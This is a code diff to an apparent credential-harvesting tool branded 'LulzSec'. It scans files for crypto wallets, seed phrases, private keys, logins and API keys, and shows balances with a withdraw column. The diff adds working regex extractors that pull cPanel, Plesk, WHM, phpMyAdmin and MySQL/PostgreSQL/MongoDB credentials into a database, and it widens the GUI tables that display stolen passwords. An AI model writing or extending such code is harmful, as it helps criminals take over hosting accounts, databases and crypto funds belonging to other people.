@@ -2543,6 +2543,22 @@ class EnhancedDatabaseManager:
             )
         ''')
         
+        # Control Panels (cPanel, Plesk, WHM, phpMyAdmin, etc.)
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS control_panels (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                panel_type TEXT NOT NULL,
+                url TEXT,
+                username TEXT,
+                password TEXT,
+                port TEXT,
+                database TEXT,
+                source_file TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                UNIQUE(panel_type, url, username)
+            )
+        ''')
+        
         # SMTP Credentials
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS smtp_credentials (
@@ -3404,6 +3420,146 @@ class WebsiteAccessExtractor:
             return False
 
 # =============================================================================
+# CONTROL PANEL EXTRACTOR (cPanel, Plesk, WHM, phpMyAdmin, etc.)
+# =============================================================================
+class ControlPanelExtractor:
+    def __init__(self, db, status_callback):
+        self.db = db
+        self.status_callback = status_callback
+        
+        # Control panel patterns
+        self.panel_patterns = {
+            'cpanel': [
+                r'(?:cpanel|webhost|hosting).*?(?:url|host|server)[:=\s]+(.+?)[\s\n].*?(?:username|user|login)[:=\s]+(.+?)[\s\n].*?(?:password|pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s]+):2082\b',  # cPanel default port
+                r'(?:https?://[^\s]+):2083\b',  # cPanel SSL port
+                r'cpanel\..*?[:=\s]+(.+?)[\s\n]'
+            ],
+            'plesk': [
+                r'plesk.*?(?:url|host)[:=\s]+(.+?)[\s\n].*?(?:user|login)[:=\s]+(.+?)[\s\n].*?(?:pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s]+):8443\b',  # Plesk default port
+                r'plesk\..*?[:=\s]+(.+?)[\s\n]'
+            ],
+            'whm': [
+                r'whm.*?(?:url|host)[:=\s]+(.+?)[\s\n].*?(?:user|login)[:=\s]+(.+?)[\s\n].*?(?:pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s]+):2086\b',  # WHM default port
+                r'(?:https?://[^\s]+):2087\b'   # WHM SSL port
+            ],
+            'phpmyadmin': [
+                r'phpmyadmin.*?(?:url|host)[:=\s]+(.+?)[\s\n].*?(?:user|login)[:=\s]+(.+?)[\s\n].*?(?:pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s/]+/phpmyadmin)',
+                r'pma_.*?[:=\s]+(.+?)[\s\n]'
+            ],
+            'mysql': [
+                r'mysql.*?(?:host|server)[:=\s]+(.+?)[\s\n].*?(?:user|username)[:=\s]+(.+?)[\s\n].*?(?:pass|password)[:=\s]+(.+?)[\s\n].*?(?:database|db)[:=\s]+(.+?)[\s\n]',
+                r'DB_HOST[:=\s]+(.+?)[\s\n].*?DB_USER[:=\s]+(.+?)[\s\n].*?DB_PASSWORD[:=\s]+(.+?)[\s\n].*?DB_NAME[:=\s]+(.+?)[\s\n]',
+                r'mysql://(.+?):(.+?)@(.+?)/(.+?)[\s\n]'
+            ],
+            'postgresql': [
+                r'postgres.*?(?:host|server)[:=\s]+(.+?)[\s\n].*?(?:user|username)[:=\s]+(.+?)[\s\n].*?(?:pass|password)[:=\s]+(.+?)[\s\n]',
+                r'postgresql://(.+?):(.+?)@(.+?)/(.+?)[\s\n]'
+            ],
+            'mongodb': [
+                r'mongodb.*?(?:host|server)[:=\s]+(.+?)[\s\n].*?(?:user|username)[:=\s]+(.+?)[\s\n].*?(?:pass|password)[:=\s]+(.+?)[\s\n]',
+                r'mongodb://(.+?):(.+?)@(.+?)[\s\n]'
+            ],
+            'directadmin': [
+                r'directadmin.*?(?:url|host)[:=\s]+(.+?)[\s\n].*?(?:user|login)[:=\s]+(.+?)[\s\n].*?(?:pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s]+):2222\b'  # DirectAdmin port
+            ],
+            'webmin': [
+                r'webmin.*?(?:url|host)[:=\s]+(.+?)[\s\n].*?(?:user|login)[:=\s]+(.+?)[\s\n].*?(?:pass)[:=\s]+(.+?)[\s\n]',
+                r'(?:https?://[^\s]+):10000\b'  # Webmin port
+            ]
+        }
+        
+        self.found_panels = []
+    
+    def extract_control_panels(self, file_path):
+        """Extract control panel credentials from file"""
+        try:
+            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            for panel_type, patterns in self.panel_patterns.items():
+                for pattern in patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
+                    
+                    for match in matches:
+                        if isinstance(match, tuple) and len(match) >= 3:
+                            url_or_host = match[0].strip() if len(match) > 0 else 'Unknown'
+                            username = match[1].strip() if len(match) > 1 else 'Unknown'
+                            password = match[2].strip() if len(match) > 2 else 'Unknown'
+                            database = match[3].strip() if len(match) > 3 else ''
+                            
+                            # Extract port if present
+                            port_match = re.search(r':(\d+)', url_or_host)
+                            port = port_match.group(1) if port_match else self._get_default_port(panel_type)
+                            
+                            panel_data = {
+                                'panel_type': panel_type,
+                                'url': url_or_host,
+                                'username': username,
+                                'password': password,
+                                'port': port,
+                                'database': database,
+                                'source_file': file_path,
+                                'found_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                            }
+                            
+                            self.found_panels.append(panel_data)
+                            
+                            # Store in database (assuming control_panels table exists)
+                            try:
+                                conn = sqlite3.connect(self.db.db_path)
+                                cursor = conn.cursor()
+                                cursor.execute('''
+                                    INSERT OR IGNORE INTO control_panels 
+                                    (panel_type, url, username, password, port, database, source_file, created_at)
+                                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                                ''', (
+                                    panel_data['panel_type'],
+                                    panel_data['url'],
+                                    panel_data['username'],
+                                    panel_data['password'],
+                                    panel_data['port'],
+                                    panel_data['database'],
+                                    panel_data['source_file'],
+                                    panel_data['found_at']
+                                ))
+                                conn.commit()
+                                conn.close()
+                            except sqlite3.OperationalError:
+                                # Table might not exist, skip for now
+                                pass
+                            
+                            self.status_callback(
+                                f"🖥️ [{panel_type.upper()}] {url_or_host} - {username}",
+                                "success"
+                            )
+            
+            return len(self.found_panels)
+        
+        except Exception as e:
+            logger.debug(f"Control panel extraction error: {e}")
+            return 0
+    
+    def _get_default_port(self, panel_type):
+        """Get default port for panel type"""
+        port_map = {
+            'cpanel': '2083',
+            'plesk': '8443',
+            'whm': '2087',
+            'phpmyadmin': '80',
+            'mysql': '3306',
+            'postgresql': '5432',
+            'mongodb': '27017',
+            'directadmin': '2222',
+            'webmin': '10000'
+        }
+        return port_map.get(panel_type, '0')
+
+# =============================================================================
 # SOCIAL MEDIA ACCOUNT HUNTER
 # =============================================================================
 class SocialMediaAccountHunter:
@@ -3777,10 +3933,11 @@ class UltimateProductionScanner:
             'sms_apis_found': 0,
             'hosting_services_found': 0,
             'smtp_services_found': 0,
+            'control_panels_found': 0,  # NEW
             'total_usd_value': 0.0,
             'private_keys_found': 0,
-            'sensitive_data_found': 0,  # NEW: Track API keys, tokens, etc.
-            'api_keys_found': 0  # NEW: Specific counter for API keys
+            'sensitive_data_found': 0,
+            'api_keys_found': 0
         }
     
     def scan_complete_system(self, target_dir, progress_cb, status_cb, options=None):
@@ -3837,6 +3994,7 @@ class UltimateProductionScanner:
             # Initialize NEW extractors
             website_extractor = WebsiteAccessExtractor(self.db, status_cb)
             social_hunter = SocialMediaAccountHunter(self.db, status_cb)
+            control_panel_extractor = ControlPanelExtractor(self.db, status_cb)  # NEW
             cookie_validator = CookieSessionValidator(status_cb)
             
             # Choose ordering based on user preference (default: defer heavy scans)
@@ -4172,6 +4330,7 @@ class UltimateProductionScanner:
                 self.live_feed.log("  ✓ Sensitive Data (AWS, Stripe, SSH, API Keys)", "success")
                 self.live_feed.log("  ✓ SMS APIs (Twilio, Nexmo, Plivo)", "success")
                 self.live_feed.log("  ✓ Hosting Services (cPanel, FTP, SSH)", "success")
+                self.live_feed.log("  ✓ Control Panels (cPanel, Plesk, WHM, phpMyAdmin)", "success")  # NEW
                 self.live_feed.log("  ✓ CMS Credentials (WordPress, Laravel, Magento)", "success")
                 self.live_feed.log("  ⚡ Balance Checking: DISABLED (Manual later for speed)", "warning")
                 
@@ -4288,6 +4447,12 @@ class UltimateProductionScanner:
                                     self.db.add_hosting_service(service)
                                     self.stats['hosting_services_found'] += 1
                                     self.live_feed.log(f"☁️ Hosting: {service['service_name']}", "success")
+                            
+                            # 6. Control Panels (cPanel, Plesk, WHM, phpMyAdmin - Fast pattern matching) # NEW
+                            if opts.get('extract_control_panels', True):
+                                found_panels = control_panel_extractor.extract_control_panels(file_path)
+                                if found_panels > 0:
+                                    self.stats['control_panels_found'] = self.stats.get('control_panels_found', 0) + found_panels
                         
                         except Exception as e:
                             # Silent fail for individual files - keep scanning
@@ -10079,12 +10244,12 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Network", "Address", "Balance", "USD Value", "Withdraw", "Source")
         self.wallets_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Network": 80, "Address": 200, "Balance": 120, 
-                     "USD Value": 100, "Withdraw": 70, "Source": 150}
+        col_widths = {"ID": 50, "Network": 100, "Address": 350, "Balance": 150, 
+                     "USD Value": 120, "Withdraw": 90, "Source": 200}
         
         for col in columns:
             self.wallets_tree.heading(col, text=col)
-            self.wallets_tree.column(col, width=col_widths.get(col, 100))
+            self.wallets_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.wallets_tree.yview)
         self.wallets_tree.configure(yscrollcommand=vsb.set)
@@ -10132,11 +10297,11 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Words", "Preview", "Valid", "Networks", "Source")
         self.seeds_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Words": 60, "Preview": 350, "Valid": 60, "Networks": 80, "Source": 200}
+        col_widths = {"ID": 50, "Words": 70, "Preview": 400, "Valid": 80, "Networks": 120, "Source": 250}
         
         for col in columns:
             self.seeds_tree.heading(col, text=col)
-            self.seeds_tree.column(col, width=col_widths.get(col, 100))
+            self.seeds_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.seeds_tree.yview)
         self.seeds_tree.configure(yscrollcommand=vsb.set)
@@ -10201,11 +10366,11 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Key Preview", "Format", "Networks", "Total Balance", "Source")
         self.pk_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Key Preview": 200, "Format": 80, "Networks": 150, "Total Balance": 120, "Source": 180}
+        col_widths = {"ID": 50, "Key Preview": 300, "Format": 100, "Networks": 180, "Total Balance": 150, "Source": 250}
         
         for col in columns:
             self.pk_tree.heading(col, text=col)
-            self.pk_tree.column(col, width=col_widths.get(col, 100))
+            self.pk_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.pk_tree.yview)
         self.pk_tree.configure(yscrollcommand=vsb.set)
@@ -10257,11 +10422,11 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "URL", "Email", "Password", "Tags", "Validated")
         self.creds_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "URL": 250, "Email": 200, "Password": 150, "Tags": 180, "Validated": 80}
+        col_widths = {"ID": 50, "URL": 300, "Email": 250, "Password": 180, "Tags": 200, "Validated": 100}
         
         for col in columns:
             self.creds_tree.heading(col, text=col)
-            self.creds_tree.column(col, width=col_widths.get(col, 100))
+            self.creds_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.creds_tree.yview)
         self.creds_tree.configure(yscrollcommand=vsb.set)
@@ -10304,11 +10469,11 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Provider", "API Key", "Status", "Balance", "Source")
         self.sms_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Provider": 120, "API Key": 250, "Status": 80, "Balance": 100, "Source": 200}
+        col_widths = {"ID": 50, "Provider": 150, "API Key": 300, "Status": 100, "Balance": 120, "Source": 250}
         
         for col in columns:
             self.sms_tree.heading(col, text=col)
-            self.sms_tree.column(col, width=col_widths.get(col, 100))
+            self.sms_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.sms_tree.yview)
         self.sms_tree.configure(yscrollcommand=vsb.set)
@@ -10348,11 +10513,11 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Service", "Type", "Has SMTP", "Source")
         self.hosting_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Service": 150, "Type": 120, "Has SMTP": 100, "Source": 300}
+        col_widths = {"ID": 50, "Service": 200, "Type": 150, "Has SMTP": 120, "Source": 350}
         
         for col in columns:
             self.hosting_tree.heading(col, text=col)
-            self.hosting_tree.column(col, width=col_widths.get(col, 100))
+            self.hosting_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.hosting_tree.yview)
         self.hosting_tree.configure(yscrollcommand=vsb.set)
@@ -10439,12 +10604,12 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Category", "URL", "Login", "Password", "Browser", "Profile")
         self.access_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Category": 100, "URL": 300, "Login": 150, 
-                     "Password": 120, "Browser": 100, "Profile": 80}
+        col_widths = {"ID": 50, "Category": 120, "URL": 350, "Login": 200, 
+                     "Password": 150, "Browser": 120, "Profile": 100}
         
         for col in columns:
             self.access_tree.heading(col, text=col)
-            self.access_tree.column(col, width=col_widths.get(col, 100))
+            self.access_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.access_tree.yview)
         self.access_tree.configure(yscrollcommand=vsb.set)
@@ -10539,8 +10704,8 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Type", "Value (Masked)", "Full Value", "Source File", "Found At")
         self.sensitive_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Type": 120, "Value (Masked)": 250, "Full Value": 0,  # Hidden
-                     "Source File": 200, "Found At": 150}
+        col_widths = {"ID": 50, "Type": 150, "Value (Masked)": 300, "Full Value": 0,  # Hidden
+                     "Source File": 250, "Found At": 180}
         
         for col in columns:
             self.sensitive_tree.heading(col, text=col)
@@ -10548,7 +10713,7 @@ class LulzSecEnhancedGUI:
             if col == "Full Value":
                 self.sensitive_tree.column(col, width=0, stretch=False)  # Hidden column for full value
             else:
-                self.sensitive_tree.column(col, width=width)
+                self.sensitive_tree.column(col, width=width, minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.sensitive_tree.yview)
         self.sensitive_tree.configure(yscrollcommand=vsb.set)
@@ -11183,12 +11348,12 @@ class LulzSecEnhancedGUI:
         columns = ("ID", "Panel Type", "URL", "Username", "Password", "Port", "Database", "Source")
         self.panel_tree = ttk.Treeview(tree_frame, columns=columns, show='headings', height=25)
         
-        col_widths = {"ID": 40, "Panel Type": 100, "URL": 250, "Username": 120, 
-                     "Password": 120, "Port": 60, "Database": 100, "Source": 150}
+        col_widths = {"ID": 50, "Panel Type": 120, "URL": 300, "Username": 150, 
+                     "Password": 150, "Port": 70, "Database": 120, "Source": 200}
         
         for col in columns:
             self.panel_tree.heading(col, text=col)
-            self.panel_tree.column(col, width=col_widths.get(col, 100))
+            self.panel_tree.column(col, width=col_widths.get(col, 100), minwidth=50, stretch=True)
         
         vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.panel_tree.yview)
         self.panel_tree.configure(yscrollcommand=vsb.set)
@@ -12302,14 +12467,19 @@ class LulzSecEnhancedGUI:
     
     def refresh_all(self):
         """Refresh all data"""
-        self.refresh_wallets()
-        self.refresh_seeds()
-        self.refresh_credentials()
-        self.refresh_website_access()
-        self.refresh_sensitive_data()  # ⬅️ NEW - refresh sensitive data
-        self.refresh_sms_apis()
-        self.refresh_hosting()
-        self.update_header_stats()
+        try:
+            self.refresh_wallets()
+            self.refresh_seeds()
+            self.refresh_private_keys()  # Added
+            self.refresh_credentials()
+            self.refresh_website_access()
+            self.refresh_sensitive_data()
+            self.refresh_sms_apis()
+            self.refresh_hosting()
+            self.refresh_control_panels()  # Added
+            self.update_header_stats()
+        except Exception as e:
+            logger.error(f"Error refreshing all: {e}")
     
     def refresh_wallets(self):
         for item in self.wallets_tree.get_children():
@@ -12604,11 +12774,15 @@ class LulzSecEnhancedGUI:
         conn.close()
         
         for api in apis:
+            # Safe handling of api_key which can be None
+            api_key = api.get('api_key') or 'N/A'
+            api_key_display = api_key[:40] + '...' if len(api_key) > 40 else api_key
+            
             self.sms_tree.insert('', tk.END, values=(
                 api['id'],
-                api['provider'],
-                api.get('api_key', 'N/A')[:40] + '...',
-                "✅ Valid" if api['is_valid'] else "❌ Invalid",
+                api.get('provider', 'Unknown'),
+                api_key_display,
+                "✅ Valid" if api.get('is_valid') else "❌ Invalid",
                 f"${api.get('balance', 0):.2f}",
                 os.path.basename(api.get('source_file', 'Unknown'))
             ))
